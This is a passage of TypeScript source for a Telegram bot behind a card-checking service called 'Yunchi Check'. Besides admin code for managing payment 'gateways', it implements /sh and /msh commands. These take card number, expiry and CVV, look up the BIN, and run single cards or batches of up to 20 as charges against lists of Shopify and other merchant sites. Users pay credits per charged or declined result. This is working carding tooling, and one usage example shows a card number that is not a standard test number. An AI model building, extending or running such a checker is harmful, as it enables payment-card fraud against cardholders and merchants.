          if (existing) {
            await sendTelegramMessage(chatId, `❌ Gateway ID <code>${escapeHtml(inputValue)}</code> already exists. Choose a different ID.`);
            return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
          }
        }

        if (currentConfig) {
          // Update the pending addition
          const updateData: Record<string, any> = {
            step: currentConfig.nextStep,
            [currentConfig.field]: inputValue === "/skip" ? null : inputValue
          };

          await supabase
            .from("pending_gateway_additions")
            .update(updateData)
            .eq("id", pendingAddition.id);

          // Show next step prompt
          if (currentConfig.nextStep === "type") {
            // Show type selection buttons
            await sendTelegramMessage(chatId, `
━━━━━━━━━━━━━━━━━━━━━━
   ➕ <b>ADD NEW GATEWAY</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>Step ${currentConfig.stepNum}/12: Gateway Type</b>
━━━━━━━━━━━━━━━━━━━━━━
${currentConfig.nextPrompt}
`, {
              inline_keyboard: [
                [{ text: "🔐 Auth ($0)", callback_data: "addgate_type_auth" }],
                [{ text: "💳 Charge", callback_data: "addgate_type_charge" }],
                [{ text: "❌ Cancel", callback_data: "addgate_cancel" }]
              ]
            });
          } else if (currentConfig.nextStep === "cvc_required") {
            // Show CVC required selection
            await sendTelegramMessage(chatId, `
━━━━━━━━━━━━━━━━━━━━━━
   ➕ <b>ADD NEW GATEWAY</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>Step 12/12: CVC Required?</b>
━━━━━━━━━━━━━━━━━━━━━━
Is CVC required for this gateway?
`, {
              inline_keyboard: [
                [
                  { text: "✅ Yes", callback_data: "addgate_cvc_true" },
                  { text: "❌ No", callback_data: "addgate_cvc_false" }
                ],
                [{ text: "❌ Cancel", callback_data: "addgate_cancel" }]
              ]
            });
          } else {
            await sendTelegramMessage(chatId, `
━━━━━━━━━━━━━━━━━━━━━━
   ➕ <b>ADD NEW GATEWAY</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>Step ${currentConfig.stepNum}/12: ${currentConfig.nextStep.replace(/_/g, " ").toUpperCase()}</b>
━━━━━━━━━━━━━━━━━━━━━━
${currentConfig.nextPrompt}
`, {
              inline_keyboard: [
                [{ text: "❌ Cancel", callback_data: "addgate_cancel" }]
              ]
            });
          }
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        // Handle edit field input
        if (step.startsWith("edit_")) {
          const editParts = step.replace("edit_", "").split("_");
          const field = editParts.pop();
          const gatewayId = editParts.join("_");

          if (field && gatewayId) {
            // Update the gateway field
            const { error: updateError } = await supabase
              .from("gateways")
              .update({ [field]: inputValue })
              .eq("id", gatewayId);

            // Delete the pending edit
            await supabase
              .from("pending_gateway_additions")
              .delete()
              .eq("id", pendingAddition.id);

            if (updateError) {
              await sendTelegramMessage(chatId, `❌ <b>Failed to update:</b>\n\n<code>${escapeHtml(updateError.message)}</code>`);
              return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
            }

            const fieldLabels: Record<string, string> = {
              name: "Display Name",
              code: "Short Code",
              description: "Description",
              card_types: "Card Types",
              speed: "Speed Rating",
              success_rate: "Success Rate",
              charge_amount: "Charge Amount",
              icon_name: "Icon Name",
              icon_color: "Icon Color",
              edge_function_name: "Edge Function",
              display_order: "Display Order"
            };

            await sendTelegramMessage(chatId, `
✅ <b>Gateway Updated!</b>

<b>${fieldLabels[field] || field}:</b> ${escapeHtml(inputValue)}

<i>Change is now live on the website!</i>
`, {
              inline_keyboard: [
                [{ text: "✏️ Continue Editing", callback_data: `editgate_select_${gatewayId}` }],
                [{ text: "🔙 Back to Menu", callback_data: "menu_back" }]
              ]
            });
            return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
          }
        }
      }
    }

    // ─────────────────────────────────────────────────────────
    // /sh - SHOPIFY CHARGE SINGLE CARD CHECK
    // ─────────────────────────────────────────────────────────

    if (text === "/sh" || text.startsWith("/sh ")) {
      const cc = text.replace("/sh", "").trim();

      if (!cc) {
        await sendTelegramMessage(chatId, `
🛍 <b>𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗖𝗛𝗔𝗥𝗚𝗘</b>

📌 <b>Usage:</b>
<code>/sh cc|mm|yy|cvv</code>

📎 <b>Example:</b>
<code>/sh 4111111111111111|12|25|123</code>

┌─── 💲 <b>Pricing</b> ───┐
│ 🟢 CHARGED ➜ 2 credits     │
│ 🔴 DECLINED ➜ 1 credit      │
│ ⚠️ UNKNOWN ➜ Free           │
└────────────────────────┘

💡 <i>Select a price range after
sending to choose Shopify sites</i>

`, undefined, messageId);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Check if user is connected
      const { data: shUserProfile } = await supabase
        .from("profiles")
        .select("user_id, username, credits, is_banned")
        .eq("telegram_chat_id", chatId)
        .maybeSingle();

      if (!shUserProfile) {
        await sendTelegramMessage(chatId, `
❌ <b>Account Not Connected</b>

Link your Telegram to use this command.

<b>Your Chat ID:</b> <code>${chatId}</code>

Visit yunchicheck.com to connect.
`, undefined, messageId);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (shUserProfile.is_banned) {
        await sendTelegramMessage(chatId, `🚫 <b>Account Suspended</b>\n\nYou cannot use this command while banned.`, undefined, messageId);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Check credits (need at least 1)
      if (shUserProfile.credits < 1) {
        await sendTelegramMessage(chatId, `
❌ <b>Insufficient Credits</b>

You need at least <b>1 credit</b> for Shopify Charge.
Current balance: <b>${shUserProfile.credits}</b> credits

Top up at yunchicheck.com/dashboard/topup
`, undefined, messageId);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Validate card format
      const shParts = cc.split("|");
      if (shParts.length < 4 || !shParts[3] || shParts[3].length < 3 || !/^\d+$/.test(shParts[3])) {
        await sendTelegramMessage(chatId, `
❌ <b>Invalid Format</b>

Use: <code>/sh CardNumber|MM|YY|CVC</code>
Example: <code>/sh 4111111111111111|12|25|123</code>
`, undefined, messageId);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // BIN lookup for card info
      const binDigits = shParts[0].replace(/\D/g, '').slice(0, 8);
      let binBrand = "Unknown"; let binType = "Unknown"; let binBank = "Unknown Bank"; let binCountry = "Unknown"; let binCountryCode = "XX"; let binLevel = "Standard";
      let brandLogo = "💳";
      
      try {
        const binResp = await fetch(`https://lookup.binlist.net/${binDigits}`, { headers: { 'Accept-Version': '3' } });
        if (binResp.ok) {
          const binData = await binResp.json();
          binBrand = binData.scheme?.toUpperCase() || "Unknown";
          binType = binData.type ? binData.type.charAt(0).toUpperCase() + binData.type.slice(1) : "Unknown";
          binBank = binData.bank?.name || "Unknown Bank";
          binCountry = binData.country?.name || "Unknown";
          binCountryCode = binData.country?.alpha2 || "XX";
          binLevel = binData.brand || "Standard";
        }
      } catch { /* fallback */ }

      // Fallback brand detection
      if (binBrand === "Unknown") {
        if (/^4/.test(binDigits)) binBrand = "VISA";
        else if (/^5[1-5]/.test(binDigits) || /^2[2-7]/.test(binDigits)) binBrand = "MASTERCARD";
        else if (/^3[47]/.test(binDigits)) binBrand = "AMEX";
        else if (/^6(?:011|5|4[4-9]|22)/.test(binDigits)) binBrand = "DISCOVER";
      }

      // Brand logos
      const brandLogos: Record<string, string> = {
        'VISA': '💙 𝗩𝗜𝗦𝗔', 'MASTERCARD': '🟠 𝗠𝗔𝗦𝗧𝗘𝗥𝗖𝗔𝗥𝗗', 'AMEX': '💚 𝗔𝗠𝗘𝗫',
        'DISCOVER': '🟧 𝗗𝗜𝗦𝗖𝗢𝗩𝗘𝗥', 'JCB': '🔴 𝗝𝗖𝗕', 'UNIONPAY': '🔵 𝗨𝗡𝗜𝗢𝗡𝗣𝗔𝗬',
        'MAESTRO': '🔷 𝗠𝗔𝗘𝗦𝗧𝗥𝗢', 'DINERS CLUB': '⚪ 𝗗𝗜𝗡𝗘𝗥𝗦',
      };
      brandLogo = brandLogos[binBrand] || `💳 ${binBrand}`;

      // Country flag emoji
      const getFlag = (code: string) => {
        if (!code || code === 'XX') return '🌍';
        return String.fromCodePoint(...[...code.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65));
      };
      const countryFlag = getFlag(binCountryCode);

      // Fetch price group counts
      const priceGroups = [
        { label: "$0 – $10", min: 0, max: 10, emoji: "💰" },
        { label: "$10 – $20", min: 10, max: 20, emoji: "💎" },
        { label: "$20 – $35", min: 20, max: 35, emoji: "🔥" },
        { label: "$35 – $100", min: 35, max: 100, emoji: "⚡" },
      ];

      const groupCounts = await Promise.all(
        priceGroups.map(async (g) => {
          let query = supabase
            .from("gateway_urls")
            .select("id", { count: "exact", head: true })
            .not("url", "like", "https://razorpay.me/%")
            .lte("price", g.max === 100 ? 100 : g.max);
          if (g.min > 0) query = query.gt("price", g.min);
          else query = query.gt("price", 0);
          const { count } = await query;
          return { ...g, count: count || 0 };
        })
      );

      const totalSites = groupCounts.reduce((a, g) => a + g.count, 0);

      // Encode cc in base64 for callback data
      const encodedCC = btoa(cc);

      // Build price group selection buttons
      const priceButtons: any[][] = [];
      for (const g of groupCounts) {
        if (g.count > 0) {
          priceButtons.push([{
            text: `${g.emoji} ${g.label}  •  ${g.count} sites`,
            callback_data: `sh_price_${g.min}_${g.max}_${encodedCC}`,
          }]);
        } else {
          priceButtons.push([{
            text: `${g.emoji} ${g.label}  •  0 sites ✖️`,
            callback_data: `sh_nosite`,
          }]);
        }
      }

      // Add "Auto (Any Range)" button
      priceButtons.push([{
        text: `🎲 𝗔𝘂𝘁𝗼 – Any Range  •  ${totalSites} sites`,
        callback_data: `sh_price_0_100_${encodedCC}`,
      }]);

      await sendTelegramMessage(chatId, `
🛍 <b>𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗖𝗛𝗔𝗥𝗚𝗘</b>

┌─── 📇 <b>Card Info</b> ───┐
│ ${brandLogo}
│ 📟 <code>${escapeHtml(cc)}</code>
│ 🏷 <b>Type:</b> ${escapeHtml(binType)} │ ${escapeHtml(binLevel)}
│ 🏦 <b>Bank:</b> ${escapeHtml(binBank)}
│ ${countryFlag} <b>Country:</b> ${escapeHtml(binCountry)}
└────────────────────────┘

┌─── 👤 <b>Account</b> ───┐
│ 🔹 ${escapeHtml(shUserProfile.username || "Unknown")}
│ 💰 <b>Balance:</b> ${shUserProfile.credits} credits
│ 🌐 <b>Sites:</b> ${totalSites} available
└────────────────────────┘

⬇️ <b>𝗦𝗲𝗹𝗲𝗰𝘁 𝗣𝗿𝗶𝗰𝗲 𝗥𝗮𝗻𝗴𝗲</b> ⬇️
`, {
        inline_keyboard: priceButtons,
      }, messageId);

      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Handle sh_nosite callback (no sites available for that range)
    // (This is handled inline - the button just shows no sites)

    // ─────────────────────────────────────────────────────────
    // /msh - MULTI SHOPIFY CHARGE BULK CHECK (up to 20 cards)
    // ─────────────────────────────────────────────────────────

    if (text === "/msh" || text.startsWith("/msh ") || text.startsWith("/msh\n")) {
      const mshInput = text.replace(/^\/msh\s*/, "").trim();

      if (!mshInput) {
        await sendTelegramMessage(chatId, `
🛍 <b>𝗠𝗨𝗟𝗧𝗜 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗖𝗛𝗔𝗥𝗚𝗘</b>

📌 <b>Usage:</b>
<code>/msh
cc|mm|yy|cvv
cc|mm|yy|cvv
cc|mm|yy|cvv</code>

📎 <b>Example:</b>
<code>/msh
4111111111111111|12|25|123
5333171146109372|10|26|100</code>

📊 <b>Limits:</b> Up to <b>20 cards</b> per batch
💎 Charged = 2 credits ・ ❌ Declined = 1 credit ・ ⚠️ Unknown = Free

💡 <i>Cards are checked one by one with live results</i>
`, undefined, messageId);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Parse cards
      const mshCardLines = mshInput.split("\n").map(l => l.trim()).filter(l => l && l.includes("|"));
      if (mshCardLines.length === 0) {
        await sendTelegramMessage(chatId, `❌ <b>No valid cards found.</b>\n\nFormat: <code>cc|mm|yy|cvv</code> (one per line)`, undefined, messageId);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }
      if (mshCardLines.length > 20) {
        await sendTelegramMessage(chatId, `❌ <b>Too many cards.</b>\n\nMax <b>20 cards</b> per batch. You sent ${mshCardLines.length}.`, undefined, messageId);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Check user
      const { data: mshUserProfile } = await supabase
        .from("profiles")
        .select("user_id, username, credits, is_banned")
        .eq("telegram_chat_id", chatId)
        .maybeSingle();

      if (!mshUserProfile) {
        await sendTelegramMessage(chatId, `❌ <b>Account Not Connected</b>\n\nLink your Telegram at yunchicheck.com\n<b>Chat ID:</b> <code>${chatId}</code>`, undefined, messageId);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }
      if (mshUserProfile.is_banned) {
        await sendTelegramMessage(chatId, `🚫 <b>Account Suspended</b>`, undefined, messageId);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }
      if (mshUserProfile.credits < mshCardLines.length) {
        await sendTelegramMessage(chatId, `❌ <b>Insufficient Credits</b>\n\nNeed at least <b>${mshCardLines.length}</b> credits for ${mshCardLines.length} cards.\nBalance: <b>${mshUserProfile.credits}</b>`, undefined, messageId);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Validate cards
      const validCards: string[] = [];
      for (const line of mshCardLines) {
        const parts = line.split("|");
        if (parts.length >= 4 && parts[3] && parts[3].length >= 3 && /^\d+$/.test(parts[3])) {
          validCards.push(line);
        }
      }

      if (validCards.length === 0) {
        await sendTelegramMessage(chatId, `❌ <b>No valid cards.</b>\n\nFormat: <code>cc|mm|yy|cvv</code>`, undefined, messageId);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Store cards in DB with short ID for callback_data (Telegram 64-byte limit)
      const mshBulkId = crypto.randomUUID().slice(0, 8);
      await supabase.from("pending_bulk_checks").insert({ id: mshBulkId, cards: validCards.join("\n"), chat_id: String(chatId), user_id: mshUserProfile.user_id });

      // Fetch price group counts
      const mshPriceGroups = [
        { label: "$0 – $10", min: 0, max: 10, emoji: "💰" },
        { label: "$10 – $20", min: 10, max: 20, emoji: "💎" },
        { label: "$20 – $35", min: 20, max: 35, emoji: "🔥" },
        { label: "$35 – $100", min: 35, max: 100, emoji: "⚡" },
      ];

      const mshGroupCounts = await Promise.all(
        mshPriceGroups.map(async (g) => {
          let query = supabase.from("gateway_urls").select("id", { count: "exact", head: true }).not("url", "like", "https://razorpay.me/%").lte("price", g.max === 100 ? 100 : g.max);
          if (g.min > 0) query = query.gt("price", g.min);
          else query = query.gt("price", 0);
          const { count } = await query;
          return { ...g, count: count || 0 };
        })
      );

      const mshTotalSites = mshGroupCounts.reduce((a, g) => a + g.count, 0);

      const mshPriceButtons: any[][] = [];
      for (const g of mshGroupCounts) {
        if (g.count > 0) {
          mshPriceButtons.push([{ text: `${g.emoji} ${g.label}  •  ${g.count} sites`, callback_data: `msh_${g.min}_${g.max}_${mshBulkId}` }]);
        } else {
          mshPriceButtons.push([{ text: `${g.emoji} ${g.label}  •  0 sites ✖️`, callback_data: `msh_nosite` }]);
        }
      }
      mshPriceButtons.push([{ text: `🎲 𝗔𝘂𝘁𝗼 – Any Range  •  ${mshTotalSites} sites`, callback_data: `msh_0_100_${mshBulkId}` }]);

      await sendTelegramMessage(chatId, `
🛍 <b>𝗠𝗨𝗟𝗧𝗜 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗖𝗛𝗔𝗥𝗚𝗘</b>

📊 <b>${validCards.length} cards</b> loaded
💰 <b>Balance:</b> ${mshUserProfile.credits} credits
🌐 <b>Sites:</b> ${mshTotalSites} available

⬇️ <b>𝗦𝗲𝗹𝗲𝗰𝘁 𝗣𝗿𝗶𝗰𝗲 𝗥𝗮𝗻𝗴𝗲</b> ⬇️
`, { inline_keyboard: mshPriceButtons }, messageId);

      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // ─────────────────────────────────────────────────────────
    // DEFAULT USER MESSAGE HANDLER
    // ─────────────────────────────────────────────────────────

    // If message is not a command and not a reply, respond with helpful message
    if (text && !text.startsWith("/")) {
      // Check if user is connected
      const { data: profile } = await supabase
        .from("profiles")
        .select("username, credits")
        .eq("telegram_chat_id", chatId)
        .maybeSingle();

      if (profile) {
        // Connected user - offer quick actions
        const responseMessage = `
━━━━━━━━━━━━━━━━━━━━━━
      🎴 <b>YUNCHI CHECK</b>
━━━━━━━━━━━━━━━━━━━━━━

Hey <b>${profile.username || "there"}</b>! 👋

I received your message but I'm a bot
that responds to specific commands.

<b>💡 Quick Actions</b>
┌─────────────────────
│ /start - Main menu
│ /mystatus - Account status
│ /help - Help & guide
└─────────────────────

<b>💰 Your Balance:</b> ${profile.credits || 0} credits

Need human support? Open a ticket
through the dashboard! 🎫

━━━━━━━━━━━━━━━━━━━━━━
`;

        await sendTelegramMessage(chatId, responseMessage, {
          inline_keyboard: [
            [
              { text: "📊 My Status", callback_data: "user_mystatus" },
              { text: "💰 Balance", callback_data: "user_balance" }
            ],
            [
              { text: "🎫 Open Support Ticket", url: "https://yunchicheck.com/dashboard/support" }
            ]
          ]
        }, messageId);
      } else {
        // Not connected user - guide them
        const responseMessage = `
━━━━━━━━━━━━━━━━━━━━━━
      🎴 <b>YUNCHI CHECK</b>
━━━━━━━━━━━━━━━━━━━━━━

Hey there! 👋

I'm the Yunchi support bot. Your 
account isn't connected yet.

<b>🔗 To Get Started</b>
┌─────────────────────
│ 1️⃣ Copy your Chat ID:
│    <code>${chatId}</code>
│ 
│ 2️⃣ Sign up on our platform
│ 3️⃣ Paste ID in profile settings
│ 4️⃣ Verify when prompted
└─────────────────────

<b>💡 Commands</b>
┌─────────────────────
│ /start - Main menu & Chat ID
│ /help - Full guide
└─────────────────────

━━━━━━━━━━━━━━━━━━━━━━
`;

        await sendTelegramMessage(chatId, responseMessage, {
          inline_keyboard: [
            [{ text: "📋 Copy Chat ID", callback_data: "user_copy_id" }],
            [{ text: "🌐 Sign Up Now", url: "https://yunchicheck.com/auth" }]
          ]
        }, messageId);
      }
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });

  } catch (error) {
    console.error("Error:", error);
    return new Response(JSON.stringify({ error: "Internal error" }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
};

serve(handler);
